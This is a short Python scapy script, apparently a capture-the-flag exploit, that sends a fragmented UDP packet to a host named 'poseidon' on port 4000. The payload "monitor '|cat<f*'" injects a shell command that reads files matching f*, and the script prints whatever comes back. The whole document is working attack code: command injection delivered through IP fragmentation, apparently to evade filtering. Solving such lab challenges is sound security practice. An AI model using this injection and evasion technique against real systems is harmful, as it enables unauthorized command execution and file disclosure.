from scapy.all import *
payload = "monitor '|cat<f*'"
pkt = Ether()/IP(dst=Net('poseidon'))/UDP(dport=4000, sport=1337)/Raw(load=payload.encode())
pkts = fragment(pkt.__class__(pkt.build()),fragsize=8)
r = srp([pkt.__class__(_.build()) for _ in pkts],timeout=1)[0]
if not r:
    print("no response")
    exit(0)
for n in r:
    l = n[1].lastlayer()
    if(l.__class__ == Raw):
        print(l.load.decode())
